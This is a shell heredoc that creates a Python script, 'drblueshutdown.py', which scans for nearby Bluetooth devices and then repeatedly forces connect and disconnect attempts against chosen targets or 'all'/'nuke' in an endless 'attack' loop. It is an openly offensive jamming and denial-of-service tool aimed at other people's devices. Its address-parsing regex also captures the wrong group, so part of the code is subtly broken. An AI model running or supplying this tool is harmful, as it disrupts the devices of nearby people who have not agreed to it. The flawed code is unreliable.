cat > drblueshutdown.py << 'EOF'
#!/usr/bin/env python3
import subprocess
import time
import re

LOGO = """
╦═───────────────────────────────────────────────────────═╦═
  ║   ▓█████▄   ██▀███   ▄▄▄▄    ██▓     █    ██ ▓█████     ║
  ║   ▒██▀ ██▌ ▓██ ▒ ██▒▓█████▄ ▓██▒     ██  ▓██▒▓█   ▀     ║
  ║   ░██   █▌ ▓██ ░▄█ ▒▒██▒ ▄██▒██░    ▓██  ▒██░▒███       ║
  ║   ░▓█▄   ▌ ▒██▀▀█▄  ▒██░█▀  ▒██░    ▓██  ░██ ▒▓█  ▄     ║
  ║   ░▒████▓  ░██▓ ▒██▒░▓█  ▀█▓░██████▒▒███████▒░▒████▒    ║
  ║    ▒▒▓  ▒  ░ ▒▓ ░▒▓░░▓██▓ ▒░░ ▒░▓  ░▒ ▒ ▒ ▒ ░░ ▒░ ░    ║
 ═╩═───────────────────────────────────────────────────────═╩═
"""

def run(cmd):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)

def scan_devices():
    print("[+] Starting Bluetooth Scan...")
    p_scan = subprocess.Popen(["bluetoothctl", "scan", "on"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(10) 
    p_scan.terminate()
    p_scan.wait()
    
    out = run("bluetoothctl devices").stdout
    devices = []
    for line in out.strip().split('\n'):
        match = re.match(r'^Device\s+([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}\s+(.+)$', line)
        if match:
            devices.append((match.group(1), match.group(2)))
    return devices

print(LOGO)
print("[+] Initializing Bluetooth Environment...")
run("sudo systemctl start bluetooth")
run("sudo rfkill unblock bluetooth")
run('echo -e "power on\\nagent NoInputNoOutput\\ndefault-agent" | bluetoothctl')

devices = scan_devices()
if not devices:
    print("[-] No devices found.")
    exit()

print(f"\n[+] Found {len(devices)} device(s):\n")
for idx, (addr, name) in enumerate(devices, 1):
    print(f"[{idx}] {name} ({addr})")

choice = input("\n> Enter device number(s) separated by commas, or 'all'/'nuke': ").strip().lower()
targets = []
if choice in ['nuke', 'all']:
    targets = devices
else:
    try:
        indices = [int(x.strip()) - 1 for x in choice.split(',')]
        targets = [devices[i] for i in indices if 0 <= i < len(devices)]
        if not targets: raise IndexError
    except (ValueError, IndexError):
        print("[-] Invalid selection.")
        exit()

print(f"\n[+] NUKE MODE ENGAGED against {len(targets)} target(s)...")
print("[+] Press Ctrl+C to stop.\n")

try:
    packets_sent = 0
    last_print_time = time.time()
    start_time = time.time()
    
    while True:
        for addr, name in targets:
            # Try to Connect
            res_connect = run(f"bluetoothctl connect {addr}")
            conn_ok = "Successful" in res_connect.stdout or "Connection successful" in res_connect.stdout
            
            # Try to Disconnect
            res_disconnect = run(f"bluetoothctl disconnect {addr}")
            disc_ok = "Disconnect successful" in res_disconnect.stdout or "Successful" in res_disconnect.stdout
            
            packets_sent += 1
            
            # Print EVERY packet as it happens
            status = "OK" if (conn_ok and disc_ok) else "FAILED"
            print(f"[>] Packet #{packets_sent} -> {name} ({addr}) [{status}]")
            
        # Update stats every second (optional, but good for rate calc)
        now = time.time()
        if now - last_print_time >= 1.0:
            elapsed = now - start_time
            rate = packets_sent / max(1, elapsed)
            print(f"[>] Total Packets: {packets_sent} | Rate: {rate:.1f}/sec", end='\r')
            last_print_time = now
            
except KeyboardInterrupt:
    pass
finally:
    elapsed_total = time.time() - start_time
    print(f"\n[+] Attack stopped.")
    print(f"[+] Total Packets Sent: {packets_sent}")
    if elapsed_total > 0:
        print(f"[+] Average Rate: {packets_sent/elapsed_total:.1f} packets/sec")
EOF